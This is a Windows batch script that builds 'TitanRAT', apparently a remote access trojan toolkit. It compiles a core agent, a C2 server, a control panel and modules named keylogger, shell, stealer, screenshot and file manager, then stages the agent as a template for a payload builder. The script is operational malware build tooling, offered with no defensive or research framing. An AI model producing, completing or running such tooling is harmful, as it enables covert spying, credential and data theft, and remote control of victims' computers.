@echo off
setlocal enabledelayedexpansion

echo ================================================
echo   TitanRAT - Full Build System
echo ================================================
echo.

set ROOT_DIR=%~dp0
cd /d "%ROOT_DIR%"

set ERROR_COUNT=0

REM ================================================
REM 1. Build Core Agent
REM ================================================
echo [1/7] Building Core Agent...
cd /d "%ROOT_DIR%Core"
if exist build_core.bat (
    call build_core.bat
    if !ERRORLEVEL! neq 0 (
        echo [!] Core Agent build failed.
        set /a ERROR_COUNT+=1
    ) else (
        echo [+] Core Agent built successfully.
    )
) else (
    echo [!] build_core.bat not found.
    set /a ERROR_COUNT+=1
)
cd /d "%ROOT_DIR%"

REM ================================================
REM 2. Build Server (C#)
REM ================================================
echo.
echo [2/7] Building Server...
cd /d "%ROOT_DIR%Server"
if exist Server.csproj (
    dotnet build Server.csproj -c Release
    if !ERRORLEVEL! neq 0 (
        echo [!] Server build failed.
        set /a ERROR_COUNT+=1
    ) else (
        echo [+] Server built successfully.
    )
) else (
    echo [!] Server.csproj not found.
    set /a ERROR_COUNT+=1
)
cd /d "%ROOT_DIR%"

REM ================================================
REM 3. Build Panel (WPF)
REM ================================================
echo.
echo [3/7] Building Panel...
cd /d "%ROOT_DIR%Panel"
if exist Panel.csproj (
    dotnet build Panel.csproj -c Release
    if !ERRORLEVEL! neq 0 (
        echo [!] Panel build failed.
        set /a ERROR_COUNT+=1
    ) else (
        echo [+] Panel built successfully.
    )
) else (
    echo [!] Panel.csproj not found.
    set /a ERROR_COUNT+=1
)
cd /d "%ROOT_DIR%"

REM ================================================
REM 4. Prepare Server/modules directory (for source)
REM ================================================
echo.
echo [4/7] Preparing Server\modules directory...
if not exist "%ROOT_DIR%Server\modules" mkdir "%ROOT_DIR%Server\modules"
if exist "%ROOT_DIR%Server\modules" (
    echo [+] Server\modules directory ready.
) else (
    echo [!] Failed to create Server\modules directory.
    set /a ERROR_COUNT+=1
)

REM ================================================
REM 5. Build Modules (screenshot, keylogger, shell, filemgr, stealer)
REM ================================================
set MODULES=screenshot keylogger shell filemgr stealer
for %%M in (%MODULES%) do (
    echo.
    echo [5.%%M] Building module: %%M
    set MODULE_DIR=%ROOT_DIR%Modules\%%M
    if exist "!MODULE_DIR!" (
        cd /d "!MODULE_DIR!"
        if exist build.bat (
            call build.bat
            if !ERRORLEVEL! neq 0 (
                echo [!] Module %%M build failed.
                set /a ERROR_COUNT+=1
            ) else (
                echo [+] Module %%M built and copied to Server\modules.
            )
        ) else (
            echo [!] build.bat not found in !MODULE_DIR!
            set /a ERROR_COUNT+=1
        )
    ) else (
        echo [!] Module directory not found: !MODULE_DIR!
        set /a ERROR_COUNT+=1
    )
    cd /d "%ROOT_DIR%"
)

REM ================================================
REM 6. Copy modules to Server output folders (Release and Debug)
REM ================================================
echo.
echo [6/7] Copying modules to Server output folders...
set SERVER_MODULES_SRC=%ROOT_DIR%Server\modules
set SERVER_OUT_DIRS=%ROOT_DIR%Server\bin\Release\net8.0 %ROOT_DIR%Server\bin\Debug\net8.0

for %%D in (%SERVER_OUT_DIRS%) do (
    if not exist "%%D" mkdir "%%D"
    if exist "%%D" (
        echo Copying modules to %%D\modules
        xcopy /E /I /Y "%SERVER_MODULES_SRC%" "%%D\modules" >nul
    )
)

REM ================================================
REM 7. Copy config.json to Server output folders
REM ================================================
echo.
echo [7/7] Copying config.json to Server output folders...
if exist "%ROOT_DIR%Core\config.json" (
    for %%D in (%SERVER_OUT_DIRS%) do (
        copy /Y "%ROOT_DIR%Core\config.json" "%%D\" >nul
        echo [+] config.json copied to %%D
    )
)

REM ================================================
REM 8. Prepare template for Builder (copy core.exe to Panel\template)
REM ================================================
echo.
echo [8/8] Preparing Builder template...
if exist "%ROOT_DIR%Core\core.exe" (
    if not exist "%ROOT_DIR%Panel\template" mkdir "%ROOT_DIR%Panel\template"
    copy /Y "%ROOT_DIR%Core\core.exe" "%ROOT_DIR%Panel\template\core_template.exe" >nul
    echo [+] core_template.exe created in Panel\template
) else (
    echo [!] core.exe not found, cannot create template.
)

REM ================================================
REM 9. Copy template to Panel output folder (so Builder can find it)
REM ================================================
echo.
echo [9/9] Copying template to Panel output...
set PANEL_OUT_DIR=%ROOT_DIR%Panel\bin\Release\net8.0-windows
if exist "%ROOT_DIR%Panel\template\core_template.exe" (
    if not exist "%PANEL_OUT_DIR%\template" mkdir "%PANEL_OUT_DIR%\template"
    copy /Y "%ROOT_DIR%Panel\template\core_template.exe" "%PANEL_OUT_DIR%\template\" >nul
    echo [+] template copied to %PANEL_OUT_DIR%\template
)

REM ================================================
REM 10. Final summary
REM ================================================
echo.
echo ================================================
if %ERROR_COUNT% equ 0 (
    echo BUILD SUCCESSFUL - No errors.
    echo.
    echo Server: %ROOT_DIR%Server\bin\Release\net8.0\TitanRAT.C2.exe
    echo Panel:   %ROOT_DIR%Panel\bin\Release\net8.0-windows\SafeOps.Panel.exe
    echo Modules: %ROOT_DIR%Server\bin\Release\net8.0\modules\
    echo Template: %ROOT_DIR%Panel\bin\Release\net8.0-windows\template\core_template.exe
) else (
    echo BUILD FAILED - %ERROR_COUNT% error(s) occurred.
)
echo ================================================
cd /d "%ROOT_DIR%"
pause
exit /b %ERROR_COUNT%